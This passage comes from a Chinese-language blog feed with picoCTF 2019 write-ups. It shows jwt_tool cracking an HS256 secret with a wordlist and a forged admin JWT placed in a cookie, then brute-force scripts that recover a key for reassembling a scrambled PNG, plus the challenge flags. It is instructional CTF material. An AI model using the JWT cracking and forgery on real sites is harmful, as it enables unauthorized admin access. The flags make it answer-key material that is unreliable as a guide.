class="line">   $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\ </span><br><span class="line">   \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |</span><br><span class="line">      $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |</span><br><span class="line">      $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |</span><br><span class="line">$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |</span><br><span class="line">$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |</span><br><span class="line">\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |</span><br><span class="line"> \______/ \__/     \__|   \__|$$$$$$\__| \______/  \______/ \__|</span><br><span class="line"> Version 1.3.2                \______|                           </span><br><span class="line"></span><br><span class="line">=====================</span><br><span class="line">Decoded Token Values:</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">Token header values:</span><br><span class="line">[+] typ = JWT</span><br><span class="line">[+] alg = HS256</span><br><span class="line"></span><br><span class="line">Token payload values:</span><br><span class="line">[+] user = Damya</span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line">JWT common timestamps:</span><br><span class="line">iat = IssuedAt</span><br><span class="line">exp = Expires</span><br><span class="line">nbf = NotBefore</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################</span></span><br><span class="line"><span class="comment">#  Options:                                            #</span></span><br><span class="line"><span class="comment">#                ==== TAMPERING ====                   #</span></span><br><span class="line"><span class="comment">#  1: Tamper with JWT data (multiple signing options)  #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#             ==== VULNERABILITIES ====                #</span></span><br><span class="line"><span class="comment">#  2: Check for the "none" algorithm vulnerability     #</span></span><br><span class="line"><span class="comment">#  3: Check for HS/RSA key confusion vulnerability     #</span></span><br><span class="line"><span class="comment">#  4: Check for JWKS key injection vulnerability       #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#            ==== CRACKING/GUESSING ====               #</span></span><br><span class="line"><span class="comment">#  5: Check HS signature against a key (password)      #</span></span><br><span class="line"><span class="comment">#  6: Check HS signature against key file              #</span></span><br><span class="line"><span class="comment">#  7: Crack signature with supplied dictionary file    #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#            ==== RSA KEY FUNCTIONS ====               #</span></span><br><span class="line"><span class="comment">#  8: Verify RSA signature against a Public Key        #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#  0: Quit                                             #</span></span><br><span class="line"><span class="comment">########################################################</span></span><br><span class="line"></span><br><span class="line">Please make a selection (1-6)</span><br><span class="line">&gt; 7</span><br><span class="line"></span><br><span class="line">Loading key dictionary...</span><br><span class="line">File loaded: /root/wordlists/rockyou.txt</span><br><span class="line">Testing passwords <span class="keyword">in</span> dictionary...</span><br><span class="line">[*] Tested 1 million passwords so far</span><br><span class="line">[*] Tested 2 million passwords so far</span><br><span class="line">[*] Tested 3 million passwords so far</span><br><span class="line">[*] Tested 4 million passwords so far</span><br><span class="line">[*] Tested 5 million passwords so far</span><br><span class="line">[*] Tested 6 million passwords so far</span><br><span class="line">[*] Tested 7 million passwords so far</span><br><span class="line"></span><br><span class="line">[+] ilovepico is the CORRECT key!</span><br></pre></td></tr></table></figure><p>然后去jwt官网生成一个user位admin的假令牌<br><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s</span><br></pre></td></tr></table></figure><p>将token替换cookie后刷新页面<br><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>picoCTF{jawt_was_just_what_you_thought_9ed4519dee8140de7a186a5df5a08d6e}</p><h2 id="Java-Script-Kiddie-Points-400"><a href="#Java-Script-Kiddie-Points-400" class="headerlink" title="Java Script Kiddie - Points: 400"></a>Java Script Kiddie - Points: 400</h2><blockquote><p>The image link appears broken… <a href="https://2019shell1.picoctf.com/problem/37330" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37330</a> or <a href="http://2019shell1.picoctf.com:37330" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37330</a><br>Hints: This is only a JavaScript problem.</p></blockquote><p>查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = [];</span><br><span class="line">$.get(<span class="string">"bytes"</span>, <span class="function"><span class="keyword">function</span><span class="params">(resp)</span> </span>&#123;</span><br><span class="line">bytes = <span class="keyword">Array</span>.from(resp.split(<span class="string">" "</span>), x =&gt; Number(x));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assemble_png</span><span class="params">(u_in)</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> LEN = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">"0000000000000000"</span>;</span><br><span class="line"><span class="keyword">var</span> shifter;</span><br><span class="line"><span class="keyword">if</span>(u_in.length == LEN)&#123;</span><br><span class="line">key = u_in;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; LEN; i++)&#123;</span><br><span class="line">shifter = key.charCodeAt(i) - <span class="number">48</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; (bytes.length / LEN); j ++)&#123;</span><br><span class="line">result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(result[result.length<span class="number">-1</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">result = result.slice(<span class="number">0</span>,result.length<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"Area"</span>).src = <span class="string">"data:image/png;base64,"</span> + btoa(String.fromCharCode.apply(<span class="keyword">null</span>, <span class="keyword">new</span> Uint8Array(result)));</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去到 bytes 页面,看到一大串十六进制码,用大佬的脚本将bytes还原成图片跑<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line">b = list(map(int, <span class="string">'254 80 209 18 188 10 188 243 2 53 69 13 255 180 221 188 56 0 2 132 0 0 243 69 252 53 190 137 64 58 147 202 185 0 183 59 13 73 155 10 253 206 63 173 96 191 230 0 158 16 59 127 0 2 73 114 156 135 33 73 73 139 237 82 243 61 0 123 165 30 26 65 191 1 255 89 0 223 223 108 241 218 78 194 148 168 1 164 78 68 228 221 155 27 0 219 137 156 1 181 32 138 68 55 0 0 87 205 161 130 68 35 0 231 0 239 170 183 188 48 1 0 174 247 252 72 95 89 164 167 69 0 248 191 37 31 84 120 0 66 45 192 110 204 48 73 82 71 136 239 50 29 128 28 0 13 231 65 208 222 5 235 32 114 56 173 229 159 144 150 156 0 215 111 72 205 113 237 25 2 249 225 102 227 179 160 192 237 243 46 64 75 144 116 157 223 177 55 50 199 95 194 6 71 60 62 119 65 121 6 13 110 161 145 214 235 228 254 77 104 223 157 52 254 107 103 146 14 147 193 85 227 36 73 193 243 119 225 119 75 4 175 65 155 210 113 127 182 252 202 98 121 191 107 3 4 210 41 235 255 235 91 214 199 222 86 35 102 55 84 231 223 98 32 192 245 234 66 251 37 113 254 252 216 141 196 24 226 186 214 150 110 166 1 158 221 252 186 143 212 161 193 192 114 202 76 51 164 196 45 126 226 246 54 159 243 225 81 206 117 197 208 207 212 247 210 239 217 32 152 252 248 251 253 118 252 82 223 31 117 134 139 117 56 190 250 5 188 115 65 130 10 143 158 91 134 186 126 193 198 159 126 14 178 87 130 52 16 117 131 252 51 137 244 244 84 186 186 239 34 30 237 239 253 71 88 61 219 76 13 22 203 68 28 231 226 111 212 124 105 69 242 21 207 189 141 145 233 191 46 28 239 197 219 96 196 100 222 195 7 54 235 246 65 222 32 1 199 249 73 55 245 206 31 191 55 45 99 136 112 208 16 223 66 120 182 2 213 12 87 131 150 243 144 211 215 233 73 150 238 211 134 96 55 32 244 128 152 229 31 96 44 169 108 207 249 115 136 224 65 235 39 213 219 99 255 242 168 239 179 100 6 206 239 251 181 99 136 72 122 31 222 65 228 16 105 164 11 115 246 34 195 159 124 49 44 190 44 134 252 248 220 86 199 91 57 98 190 185 227 171 120 214 106 11 24 187 189 124 249 197 4 98 33 250 109 59 127 114 125 152 200 121 0 163 170 143 127 80 242 222 51 157 143 223 215 196 70 99 161 55 252 98 145 120 227 53 9 17 0 253 197 181 254 124 254 218 253 186 17 171 99 226 146 94 70 13 188 175 233 233 165 86 111 108 210 235 56 115 157 241 127 209 251 48 169 15 81 190 10 157 243 193 214 243 126 225 189 105 31 27 75 29 234 223 118 31 213 73 246 80 245 210 11 159 127 104 237 90 63 170 74 115 149 220 167 231 31 180 162 127 239 88 97 113 126 180 111 108 239 109 167 106 15 143 117 107 113 39 79 171 139 82 157 166 191 191 254 79 129 255 241 211 27 175 125 98 85 93 253 90 154 107 227 250 206 245 64 205 243 244 87 180 172 231 190 235 78 75 25 206 196 59 247 162 0 252 254 90 158 215 159 154 102 236 234'</span>.split(<span class="string">' '</span>)))</span><br><span class="line">png_header = <span class="string">'89504e470d0a1a0a0000000d49484452'</span></span><br><span class="line">png_header = [png_header[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(png_header) // <span class="number">2</span>)]</span><br><span class="line">png_header = list(map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), png_header))</span><br><span class="line">LEN = <span class="number">16</span></span><br><span class="line">key = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(LEN)]</span><br><span class="line">shifters = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">    shifters_i = []</span><br><span class="line">    <span class="keyword">for</span> shifter <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> b[(shifter * LEN) % len(b) + i] == png_header[i]:</span><br><span class="line">            shifters_i.append(shifter)</span><br><span class="line">    shifters.append(shifters_i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble_png</span><span class="params">(k)</span>:</span></span><br><span class="line">    result = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30000</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">        shifter = ord(k[i]) - ord(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b) // LEN):</span><br><span class="line">            result[(j * LEN) + i] = b[(((j + shifter) * LEN) % len(b)) + i]</span><br><span class="line">    i = len(result) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    result = result[:i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">valid_keys = []</span><br><span class="line">print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Candidate'</span>, <span class="string">'isValid?'</span>))</span><br><span class="line"><span class="keyword">for</span> i, key_candidate <span class="keyword">in</span> enumerate(itertools.product(*shifters)):</span><br><span class="line">    key_candidate = <span class="string">''</span>.join(map(str, key_candidate))</span><br><span class="line">    png_candidate = assemble_png(key_candidate)</span><br><span class="line">    f = io.BytesIO(bytes(png_candidate))</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pilimage = Image.open(f)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        valid_keys.append(key_candidate)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(i, key_candidate, valid))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> valid_keys:</span><br><span class="line">    f = io.BytesIO(bytes(assemble_png(key)))</span><br><span class="line">    pilimage = Image.open(f)</span><br><span class="line">    decoded = decode(pilimage)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'picoCTF'</span> <span class="keyword">in</span> str(decoded.data):</span><br><span class="line">        print(str(decoded.data, <span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{cad9a05f668a0c9d2543a9867a998cbd}</p><h2 id="Java-Script-Kiddie-2-Points-450"><a href="#Java-Script-Kiddie-2-Points-450" class="headerlink" title="Java Script Kiddie 2 - Points: 450"></a>Java Script Kiddie 2 - Points: 450</h2><blockquote><p>The image link appears broken… twice as badly… <a href="https://2019shell1.picoctf.com/problem/49893" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/49893</a> or <a href="http://2019shell1.picoctf.com:49893" target="_blank" rel="noopener">http://2019shell1.picoctf.com:49893</a><br>Hints: This is only a JavaScript problem.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = [];</span><br><span class="line">$.get(<span class="string">"bytes"</span>, <span class="function"><span class="keyword">function</span><span class="params">(resp)</span> </span>&#123;</span><br><span class="line">bytes = <span class="keyword">Array</span>.from(resp.split(<span class="string">" "</span>), x =&gt; Number(x));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assemble_png</span><span class="params">(u_in)</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> LEN = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">"00000000000000000000000000000000"</span>;</span><br><span class="line"><span class="keyword">var</span> shifter;</span><br><span class="line"><span class="keyword">if</span>(u_in.length == key.length)&#123;</span><br><span class="line">key = u_in;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; LEN; i++)&#123;</span><br><span class="line">shifter = Number(key.slice((i*<span class="number">2</span>),(i*<span class="number">2</span>)+<span class="number">1</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; (bytes.length / LEN); j ++)&#123;</span><br><span class="line">result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(result[result.length<span class="number">-1</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">result = result.slice(<span class="number">0</span>,result.length<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"Area"</span>).src = <span class="string">"data:image/png;base64,"</span> + btoa(String.fromCharCode.apply(<span class="keyword">null</span>, <span class="keyword">new</span> Uint8Array(result)));</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用第一题的脚本依旧可以跑出来flag<br><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>picoCTF{9e8a320ce2243468099aaf4047094320}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一般技能-General-Skills&quot;&gt;&lt;a href=&quot;#一般技能-General-Skills&quot; class=&quot;headerlink&quot; title=&quot;一般技能(General Skills)&quot;&gt;&lt;/a&gt;一般技能(General Skills)&lt;/h1&gt;&lt;h2
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
</feed>
